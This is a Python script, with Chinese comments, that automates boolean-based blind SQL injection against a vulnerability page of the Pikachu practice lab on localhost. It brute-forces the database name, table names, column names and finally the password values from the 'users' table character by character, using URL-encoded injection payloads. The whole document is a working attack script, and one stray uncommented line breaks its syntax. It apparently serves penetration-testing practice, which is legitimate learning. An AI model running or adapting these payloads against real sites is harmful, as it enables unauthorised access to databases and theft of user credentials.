import requests

s = requests.session()
url = "http://127.0.0.1/pika/vul/sqli/sqli_blind_b.php"  # 选择攻击的网址

# headers = {'cookie': ''}  # 需要登录的可以添加cookie值

爆破数据库的长度
for l in range(1, 25):
    # 这里对#和\都进行了url编码处理，在#好后将完整的url拼接起来,然后注意了，需要url转码，例如'需要变成%27
    databaselen_payload = "?name=vince%27and+length(database())="+str(l)+"%23&submit=查询"
    # 写入判断布尔类型是否存在的根据，如果比较登录成功的文字是否在对应网页的文本中， 是则可以继续，如果反馈错误，则说明数据库长度到头了，直接break
    if "your email is:" in s.get(url+databaselen_payload).text:
        database_len = l
        break
# 打印出来
print("database_length:", str(database_len))

# 暴数据库的名
database_name = ''
for l in range(1, database_len+1):
    for i in range(1, 128):
        # 拼接完整的url ?name=vince' and ascii(substr(database(),"+str(l)+",1))="+str(i)+"#
        databasename_payload = "?name=vince%27+and+ascii%28substr%28database%28%29%2C"+str(l)+"%2C1%29%29%3D"+str(i)+"%23&submit=查询"
        # 查看返回值是否正确
        if 'your email is:' in s.get(url+databasename_payload).text:
            database_name = database_name + chr(i)
            break
print('database_name:', database_name)

# 爆表的个数
for l in range(1, 50):
    # 拼接完整的url ?name=vince' and (select count(table_name) from information_schema.tables where table_schema=database())="+str(l)+"#
    tablenumber_payload = "?name=vince%27+and+%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D"+str(l)+"%23&submit=查询"
    if 'your email is:' in s.get(url + tablenumber_payload).text:
        tablenumber = l
        break
print('tablenumber:', tablenumber)

# 爆表名（老规矩，先爆破长度，再爆破内容）
for l in range(0, tablenumber):
    table_name = ''
    # 爆破长度
    for i in range(1, 25):
        # 拼接完整的url ?name=vince' and length(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(l)+",1),1))="+str(i)+"#
        tablelen_payload = "?name=vince%27+and+length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+"+str(l)+"%2C1%29%2C1%29%29%3D"+str(i)+"%23&submit=查询"
        if 'your email is:' in s.get(url + tablelen_payload).text:
            tablelen = i
            break
    print("table"+str(l+1)+":", tablelen)
    # 爆破名字
    for m in range(0, tablelen+1):
        for n in range(1,128):
            # 拼接完整的url ?name=vince' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(l)+",1),"+str(m)+",1))="+str(n)+"#
            tablename_payload = "?name=vince%27+and+ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+"+str(l)+"%2C1%29%2C"+str(m)+"%2C1%29%29%3D"+str(n)+"%23&submit=查询"
            if 'your email is:' in s.get(url + tablename_payload).text:
                table_name = table_name + chr(n)
                break
    print("tablename"+str(l+1), ":", table_name)

# 爆列的个数
for l in range(1, 50):
    # 拼接完整的url ?name=vince' and (select count(column_name) from information_schema.columns where table_name='users')="+str(l)+"#
    columnnumber_payload = "?name=vince%27+and+%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27%29%3D"+str(l)+"%23&submit=查询"
    if 'your email is:' in s.get(url + columnnumber_payload).text:
        columnnumber = l
        break
print('tablenumber:', columnnumber)

# 爆列名（老规矩，先爆破长度，再爆破内容）
for l in range(0, columnnumber):
    column_name = ''
    # 爆破长度
    for i in range(1, 25):
        # 拼接完整的url ?name=vince' and length(substr((select column_name from information_schema.columns where table_name='users' limit "+str(l)+",1),1))="+str(i)+"#
        columnlen_payload = "?name=vince%27+and+length%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+"+str(l)+"%2C1%29%2C1%29%29%3D"+str(i)+"%23&submit=查询"
        if 'your email is:' in s.get(url + columnlen_payload).text:
            columnlen = i
            break
    print("column"+str(l+1), ":", columnlen)
    # 爆破名字
    for m in range(0, columnlen+1):
        for n in range(1,128):
            # 拼接完整的url ?name=vince' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit "+str(l)+",1),"+str(m)+",1))="+str(n)+"#
            columnname_payload = "?name=vince%27+and+ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+"+str(l)+"%2C1%29%2C"+str(m)+"%2C1%29%29%3D"+str(n)+"%23&submit=查询"
            if 'your email is:' in s.get(url + columnname_payload).text:
                column_name = column_name + chr(n)
                break
    print("tablename"+str(l+1), ":", column_name)

# 爆数据的条数
for l in range(1, 200):
    # 拼接完整的url   从users表中选username列   ?name=vince' and (select count(password) from users)="+str(l)+"#
    datanumber_payload = "?name=vince%27+and+%28select+count%28password%29+from+users%29%3D"+str(l)+"%23&submit=查询"
    if 'your email is:' in s.get(url + datanumber_payload).text:
        datanumber = l
        break
print('datenumber:', datanumber)

# 爆数据内容（老规矩，先爆破长度，再爆破内容）
for l in range(0, datanumber):
    data_name = ''
    # 爆破长度
    for i in range(1, 200):
        # 拼接完整的url ?name=vince' and length(substr((select password from users limit "+str(l)+",1),1))="+str(i)+"#
        datalen_payload = "?name=vince%27+and+length%28substr%28%28select+password+from+users+limit+"+str(l)+"%2C1%29%2C1%29%29%3D"+str(i)+"%23&submit=查询"
        if 'your email is:' in s.get(url + datalen_payload).text:
            datalen = i
            break
    print("data"+str(l+1), ":", datalen)
    # 爆破名字
    for m in range(0, datalen+1):
        for n in range(1,128):
            # 拼接完整的url ?name=vince' and ascii(substr((select password from users limit "+str(l)+",1),"+str(m)+",1))="+str(n)+" #
            dataname_payload = "?name=vince%27+and+ascii%28substr%28%28select+password+from+users+limit+"+str(l)+"%2C1%29%2C"+str(m)+"%2C1%29%29%3D"+str(n)+"+%23&submit=查询"
            if 'your email is:' in s.get(url + dataname_payload).text:
                data_name = data_name + chr(n)
                break
    print("dataname"+str(l+1), ":", data_name)